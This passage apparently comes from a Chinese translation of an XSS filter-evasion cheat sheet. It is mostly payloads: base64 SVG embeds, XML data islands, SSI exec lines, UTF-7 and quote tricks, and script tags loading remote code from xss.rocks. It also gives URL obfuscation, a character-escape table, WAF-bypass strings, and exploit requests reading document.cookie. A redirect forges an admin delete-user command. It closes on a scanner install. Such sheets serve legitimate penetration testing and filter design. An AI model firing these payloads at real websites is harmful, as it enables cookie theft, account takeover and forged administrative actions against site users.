&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw        IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&amp;gt;&amp;lt;/EMBED&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用embed-svg包含攻击向量&quot;&gt;使用EMBED SVG包含攻击向量&lt;/h2&gt;

&lt;p&gt;该示例只在FireFox下有效，但是比上面的攻击向量在FireFox下好，因为不需要用户安装或启用FLASH。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw        IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;在flash中使用actionscript混淆xss攻击向量&quot;&gt;在FLASH中使用ActionScript混淆XSS攻击向量&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;a=&quot;get&quot;;
b=&quot;URL(\&quot;&quot;;
c=&quot;javascript:&quot;;
d=&quot;alert('XSS');\&quot;)&quot;;
eval(a+b+c+d);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cdata混淆的xml数据岛&quot;&gt;CDATA混淆的XML数据岛&lt;/h2&gt;

&lt;p&gt;这个XSS攻击只在IE和使用IE渲染模式的Netscape 8.1下有效-攻击向量由Sec Consult在审计Yahoo时发现&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XML ID=&quot;xss&quot;&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=&quot;javas&amp;lt;!-- --&amp;gt;cript:alert('XSS')&quot;&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;
&amp;lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&amp;gt;&amp;lt;/SPAN&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用xml数据岛生成含内嵌javascript的本地xml文件&quot;&gt;使用XML数据岛生成含内嵌JavaScript的本地XML文件&lt;/h2&gt;

&lt;p&gt;这和上面是一样的但是将来源替换为了包含跨站脚本攻击向量的本地XML文件（必须在同一服务器上）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XML SRC=&quot;xsstest.xml&quot; ID=I&amp;gt;&amp;lt;/XML&amp;gt;
&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;xml中使用htmltime&quot;&gt;XML中使用HTML+TIME&lt;/h2&gt;

&lt;p&gt;这是Grey Magic攻击Hotmail和Yahoo的方法。这只在IE和IE渲染模式下的Netscape8.1有效并且记得需要在HTML域的BODY标签中间才有效：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;        
&amp;lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&amp;gt;
&amp;lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&amp;gt;
&amp;lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;
&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用一些字符绕过js过滤&quot;&gt;使用一些字符绕过”.js”过滤&lt;/h2&gt;

&lt;p&gt;你可以将你的JavaScript文件重命名为图像来作为XSS攻击向量：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=&quot;http://xss.rocks/xss.jpg&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ssi服务端脚本包含&quot;&gt;SSI（服务端脚本包含）&lt;/h2&gt;

&lt;p&gt;这需要在服务器端允许SSI来使用XSS攻击向量。似乎不用提示这点，因为如果你可以在服务器端执行指令那一定是有更严重的问题存在：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;!--#exec cmd=&quot;/bin/echo '&amp;lt;SCR'&quot;--&amp;gt;&amp;lt;!--#exec cmd=&quot;/bin/echo 'IPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;'&quot;--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;php&quot;&gt;PHP&lt;/h2&gt;

&lt;p&gt;需要服务器端安装了PHP来使用XSS攻击向量。同样，如果你可以远程运行任意脚本，那会有更加严重的问题：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;? echo('&amp;lt;SCR)';
echo('IPT&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;'); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;嵌入命令的image&quot;&gt;嵌入命令的IMAGE&lt;/h2&gt;

&lt;p&gt;当页面受密码保护并且这个密码保护同样适用于相同域的不同页面时有效，这可以用来进行删除用户，增加用户（如果访问页面的是管理员的话），将密码发送到任意地方等等。。。这是一个较少使用当时更有价值的XSS攻击向量&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;嵌入命令的image-ii&quot;&gt;&lt;strong&gt;嵌入命令的IMAGE II&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个302或304（其他的也有效）来重定向图片到指定命令。所以一个普通的&lt;img src=&quot;httx://badguy.com/a.jpg&quot; /&gt;对于访问图片链接的用户来说也有可能是一个攻击向量。下面是利用.htaccess（Apache）配置文件来实现攻击向量。（感谢Timo提供这部分。）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;amp;deleteuser
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cookie篡改&quot;&gt;Cookie篡改&lt;/h2&gt;

&lt;p&gt;尽管公认不太实用，但是还是可以发现一些允许使用META标签的情况下可用它来覆写cookie。另外的例子是当用户访问网站页面时，一些网站读取并显示存储在cookie中的用户名，而不是数据库中。当这两种场景结合时，你可以修改受害者的cookie以便将JavaScript注入到其页面中（你可以使用这个让用户登出或改变他们的用户状态，甚至可以让他们以你的账户登录）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;utf-7编码&quot;&gt;UTF-7编码&lt;/h2&gt;

&lt;p&gt;如果存在XSS的页面没有提供页面编码头部，或者使用了任何设置为使用UTF-7编码的浏览器，就可以使用下列方式进行攻击（感谢Roman  Ivanov提供）。这在任何不改变编码类型的现代浏览器上是无效的，这也是为什么标记为完全不支持的原因。Watchfire在Google的自定义404脚本中发现这个问题：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用html引号包含的xss&quot;&gt;利用HTML引号包含的XSS&lt;/h2&gt;

&lt;p&gt;这在IE中测试通过，但还得视情况而定。它是为了绕过那些允许”&lt;script&gt;&quot;但是不允许&quot;&amp;lt;SCRIPT SRC...&quot;形式的正则过滤即&quot;/&amp;lt;script[^&amp;gt;]+src/i&quot;：&lt;/script&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是为了绕过那些允许”&lt;script&gt;&quot;但是不允许&quot;&amp;lt;SCRIPTSRC...&quot;形式的正则过滤即&quot;  /&amp;lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|'(.)*?'|[^'&quot;&amp;gt;\s]+))?)+\s*|\s*)src/i&quot;（这很重要，因为在实际环境中出现过这种正则过滤）：&lt;/script&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT =&quot;&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;另一个绕过此正则过滤” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
      &lt;td&gt;’(.)*?’&lt;/td&gt;
      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
      &lt;td&gt;\s*)src/i”的XSS：&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;&quot; '' SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;又一个绕过正则过滤”  /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
      &lt;td&gt;’(.)*?’&lt;/td&gt;
      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
      &lt;td&gt;\s*)src/i”的XSS。尽管不想提及防御方法，但如果你想允许&lt;script&gt;标签但不加载远程脚本，针对这种XSS只能使用状态机去防御（当然如果允许&lt;script&gt;标签的话，还有其他方法绕过）&lt;/script&gt;&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT &quot;a='&amp;gt;'&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;最后一个绕过此正则过滤” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
      &lt;td&gt;’(.)*?’&lt;/td&gt;
      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
      &lt;td&gt;\s*)src/i”的XSS，使用了重音符（在FireFox下无效）：&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=`&amp;gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是一个XSS样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;'&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;url字符绕过&quot;&gt;URL字符绕过&lt;/h2&gt;

&lt;p&gt;假定”http://www.google.com/”是不被允许的：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IP代替域名&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://66.102.7.147/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;URL编码&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;双字节编码&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://1113982867/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;十六进制编码&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;每个数字的允许的范围大概是240位字符，就如你在第二位上看到的，并且由于十六进制是在0到F之间，所以开头的0可以省略:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;八进制编码&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;又一次允许填充，尽管你必须保证每类在4位字符以上-例如A类，B类等等&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;  &amp;lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;混合编码&quot;&gt;&lt;strong&gt;混合编码&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;让我们混合基本编码并在其中插入一些TAB和换行，虽然不知道浏览器为什么允许这样做。TAB和换行只有被引号包含时才有效&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    &amp;lt;A HREF=&quot;h

    tt	p://6	6.000146.0x7.147/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;协议解析绕过&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;(// 替代http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题)  而且可以轻松绕过类似”(ht&lt;/td&gt;
      &lt;td&gt;f)tp(s)?://”的正则过滤(感谢Ozh提供这部分).你也可以将”//”换成”\“。你需要保证斜杠在正确的位置，否则可能被当成相对路径URL:&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;//www.google.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Firefox使用Google的”feeling  lucky”功能根据用户输入的任何关键词来将用户重定向。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击FireFox用户。这使用了Firefox的”keyword:”协议。你可以像下面一样使用多个关键词”keyword:XSS+RSnake”。这在Firefox2.0后不再有效.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;//google&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这使用了一个仅在FireFox上有效的小技巧，因为它实现了”feelinglucky”功能。不像下面一个例子，这个在Opera上无效因为Opera会认为只是一个老式的HTTP基础认证钓鱼攻击，但它并不是。它只是一个畸形的URL。如果你点击了对话框的确定，它就可以生效。但是在Opera上会是一个错误对话框，所以认为其不被Opera所支持，同样在Firefox2.0后不再有效。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://ha.ckers.org@google&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这是一个畸形的URL只在FireFox和Opera下有效，因为它们实现了”feeling lucky”功能。像上面的例子一样，它要求你的攻击页面在Google上特定关键词排名第一（在这个示例里关键词是”google”）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://google:ha.ckers.org&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;移除别名&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;当结合上面的URL，移除”www.”会节约4个字节，总共为正确设置的服务器节省9字节:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://google.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;绝对DNS名称后额外的点&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://www.google.com./&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;JavaScriptlink location&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;内容替换作为攻击向量&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;假设”http://www.google.com/”会自动替换为空。我实际使用过类似的攻击向量即通过使用转换过滤器本身（示例如下）来帮助构建攻击向量以对抗现实世界的XSS过滤器:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://www.google.com/ogle.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;字符转义表&quot;&gt;字符转义表&lt;/h2&gt;

&lt;p&gt;下面是HTML和JavaScript中字符“&amp;lt;”的所有可能组合。其中大部分不会被渲染出来，但其中许多可以在某些情况下呈现出来。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;
%3C
&amp;amp;lt
&amp;amp;lt;
&amp;amp;LT
&amp;amp;LT;
&amp;amp;#60
&amp;amp;#060
&amp;amp;#0060
&amp;amp;#00060
&amp;amp;#000060
&amp;amp;#0000060
&amp;amp;#60;
&amp;amp;#060;
&amp;amp;#0060;
&amp;amp;#00060;
&amp;amp;#000060;
&amp;amp;#0000060;
&amp;amp;#x3c
&amp;amp;#x03c
&amp;amp;#x003c
&amp;amp;#x0003c
&amp;amp;#x00003c
&amp;amp;#x000003c
&amp;amp;#x3c;
&amp;amp;#x03c;
&amp;amp;#x003c;
&amp;amp;#x0003c;
&amp;amp;#x00003c;
&amp;amp;#x000003c;
&amp;amp;#X3c
&amp;amp;#X03c
&amp;amp;#X003c
&amp;amp;#X0003c
&amp;amp;#X00003c
&amp;amp;#X000003c
&amp;amp;#X3c;
&amp;amp;#X03c;
&amp;amp;#X003c;
&amp;amp;#X0003c;
&amp;amp;#X00003c;
&amp;amp;#X000003c;
&amp;amp;#x3C
&amp;amp;#x03C
&amp;amp;#x003C
&amp;amp;#x0003C
&amp;amp;#x00003C
&amp;amp;#x000003C
&amp;amp;#x3C;
&amp;amp;#x03C;
&amp;amp;#x003C;
&amp;amp;#x0003C;
&amp;amp;#x00003C;
&amp;amp;#x000003C;
&amp;amp;#X3C
&amp;amp;#X03C
&amp;amp;#X003C
&amp;amp;#X0003C
&amp;amp;#X00003C
&amp;amp;#X000003C
&amp;amp;#X3C;
&amp;amp;#X03C;
&amp;amp;#X003C;
&amp;amp;#X0003C;
&amp;amp;#X00003C;
&amp;amp;#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;绕过waf的方法&quot;&gt;绕过WAF的方法&lt;/h1&gt;

&lt;h2 id=&quot;通用问题&quot;&gt;通用问题&lt;/h2&gt;

&lt;h3 id=&quot;存储型xss&quot;&gt;存储型XSS&lt;/h3&gt;

&lt;p&gt;如果攻击者已经让XSS绕过过滤器，WAF无法阻止攻击透过&lt;/p&gt;

&lt;h3 id=&quot;基于javascript的反射型xss&quot;&gt;基于JavaScript的反射型XSS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;示例: &amp;lt;script&amp;gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &amp;lt;/script&amp;gt;

利用: /?xss=500); alert(document.cookie);//
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;基于dom的xss&quot;&gt;基于DOM的XSS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;示例: &amp;lt;script&amp;gt; ... eval($_GET[xss]); ... &amp;lt;/script&amp;gt;

利用: /?xss=document.cookie
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;通过请求重定向构造xss&quot;&gt;&lt;strong&gt;通过请求重定向构造XSS&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;存在漏洞代码:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    ...

     header('Location: '.$_GET['param']);

    ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样包括:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;    ...

     header('Refresh: 0; URL='.$_GET['param']);

    ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种请求不会绕过WAF:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;/?param=javascript:alert(document.cookie)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种请求可以绕过WAF并且XSS攻击可以在某些浏览器执行:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;绕过&lt;/strong&gt;WAF可用&lt;strong&gt;字符串.&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    &amp;lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&amp;gt;

    &amp;lt;Video&amp;gt; &amp;lt;source onerror = &quot;javascript: alert (XSS)&quot;&amp;gt;

    &amp;lt;Input value = &quot;XSS&quot; type = text&amp;gt;

    &amp;lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&amp;gt;

    &amp;lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&amp;gt;

    &quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;”&amp;gt;’&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;

    &quot;&amp;gt;&amp;lt;img src=&quot;x:x&quot; onerror=&quot;alert(XSS)&quot;&amp;gt;

    &quot;&amp;gt;&amp;lt;iframe src=&quot;javascript:alert(XSS)&quot;&amp;gt;

    &amp;lt;object data=&quot;javascript:alert(XSS)&quot;&amp;gt;

    &amp;lt;isindex type=image src=1 onerror=alert(XSS)&amp;gt;

    &amp;lt;img src=x:alert(alt) onerror=eval(src) alt=0&amp;gt;

    &amp;lt;img  src=&quot;x:gif&quot; onerror=&quot;window['al\u0065rt'](0)&quot;&amp;gt;&amp;lt;/img&amp;gt;

    &amp;lt;iframe/src=&quot;data:text/html,&amp;lt;svg onload=alert(1)&amp;gt;&quot;&amp;gt;

    &amp;lt;meta content=&quot;&amp;amp;NewLine; 1 &amp;amp;NewLine;; JAVASCRIPT&amp;amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&amp;gt;

    &amp;lt;svg&amp;gt;&amp;lt;script xlink:href=data&amp;amp;colon;,window.open('https://www.google.com/')&amp;gt;&amp;lt;/script

    &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&amp;gt;

    &amp;lt;iframe src=javascript&amp;amp;colon;alert&amp;amp;lpar;document&amp;amp;period;location&amp;amp;rpar;&amp;gt;

    &amp;lt;form&amp;gt;&amp;lt;a href=&quot;javascript:\u0061lert(1)&quot;&amp;gt;X

    &amp;lt;/script&amp;gt;&amp;lt;img/*%00/src=&quot;worksinchrome&amp;amp;colon;prompt(1)&quot;/%00*/onerror='eval(src)'&amp;gt;

    &amp;lt;style&amp;gt;//*{x:expression(alert(/xss/))}//&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt; 

    On Mouse Over​

    &amp;lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror='prompt(1)'&quot;&amp;gt;

    &amp;lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;amp;#97v&amp;amp;#97script:&amp;amp;#97lert(1)&amp;gt;ClickMe

    &amp;lt;script x&amp;gt; alert(1) &amp;lt;/script 1=2

    &amp;lt;form&amp;gt;&amp;lt;button formaction=javascript&amp;amp;colon;alert(1)&amp;gt;CLICKME

    &amp;lt;input/onmouseover=&quot;javaSCRIPT&amp;amp;colon;confirm&amp;amp;lpar;1&amp;amp;rpar;&quot;

    &amp;lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;alert混淆以绕过过滤器&quot;&gt;Alert混淆以绕过过滤器&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;(alert)(1)

a=alert,a(1)

[1].find(alert)

top[“al”+”ert”](1)

top[/al/.source+/ert/.source](1)

al\u0065rt(1)

top[‘al\145rt’](1)

top[‘al\x65rt’](1)

top[8680439..toString(30)](1)
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;xss扫描工具&quot;&gt;xss扫描工具&lt;/h1&gt;

&lt;p&gt;xspear&lt;/p&gt;

&lt;p&gt;安装:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gem install XSpear
